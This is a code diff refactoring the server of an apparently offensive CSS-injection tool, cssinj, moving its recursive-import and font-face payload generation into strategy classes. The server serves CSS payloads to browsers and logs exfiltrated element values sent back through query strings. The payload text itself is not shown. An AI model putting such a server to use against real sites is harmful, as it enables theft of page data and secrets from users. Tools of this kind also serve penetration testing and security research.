@@ -4,7 +4,7 @@ from aiohttp import web
 
 from cssinj.client import Client
 from cssinj.console import Console
-from cssinj.exfiltrator import injection
+from cssinj.strategies import get_strategy
 from cssinj.utils.dom import Attribut, Element
 from cssinj.utils.error import InjectionError
 
@@ -19,7 +19,18 @@ class Server:
         self.method = args.method
         self.clients = clients
         self.output_file = output_file
+        self.complete = args.complete
+        self.structure = args.structure
         self.app = web.Application(middlewares=[self.error_middleware, self.dynamic_router_middleware])
+
+        # Instantiate the strategy
+        StrategyClass = get_strategy(args.method)
+        self.strategy = StrategyClass(
+            hostname=self.hostname,
+            port=self.port,
+            element=self.element,
+            attribut=self.attribut,
+        )
 
     async def start(self):
         self.runner = web.AppRunner(self.app)
@@ -54,21 +65,11 @@ class Server:
         if self.show_details:
             for key, value in request.headers.items():
                 Console.log("connection_details", f"{key} : {value}")
-        if self.method == "recursive":
-            return web.Response(
-                text=injection.generate_next_import(self.hostname, self.port, client),
-                content_type="text/css",
-            )
-        elif self.method == "font-face":
-            return web.Response(
-                text=injection.generate_payload_font_face(
-                    hostname=self.hostname,
-                    port=self.port,
-                    element=self.element,
-                    client=client,
-                ),
-                content_type="text/css",
-            )
+
+        return web.Response(
+            text=self.strategy.generate_start_payload(client),
+            content_type="text/css",
+        )
 
     async def handle_end(self, request):
         client_id = request.query.get("cid")
@@ -94,7 +95,7 @@ class Server:
         client.data = ""
 
         return web.Response(
-            text="ok",
+            text=self.strategy.handle_end(client),
             content_type="text/css",
         )
 
@@ -112,13 +113,7 @@ class Server:
         client.event.clear()
 
         return web.Response(
-            text=injection.generate_payload_recursive_import(
-                hostname=self.hostname,
-                port=self.port,
-                element=self.element,
-                attribut=self.attribut,
-                client=client,
-            ),
+            text=self.strategy.generate_next_payload(client),
             content_type="text/css",
         )
 
@@ -131,22 +126,17 @@ class Server:
 
         client.event.set()
         client.data = request.query.get("t")
-        if self.method == "font-face":
-            element = Element(name=client.data)
-            client.elements.append(element)
+
         if self.output_file:
             self.output_file.update()
 
-        if self.show_details or self.method == "font-face":
+        if self.show_details:
             Console.log(
                 "exfiltration",
                 f"[{client.id}] - Exfiltrating element: {client.data}",
             )
 
-        if self.method == "recursive":
-            return web.Response(text="ok.", content_type="image/x-icon")
-        elif self.method == "font-face":
-            return web.Response(text="ok.", content_type="application/x-font-ttf")
+        return web.Response(text=self.strategy.handle_valid(client, request.query.get("t")), content_type="text/css")
 
     async def dynamic_router_middleware(self, app, handler):
         async def middleware_handler(request):
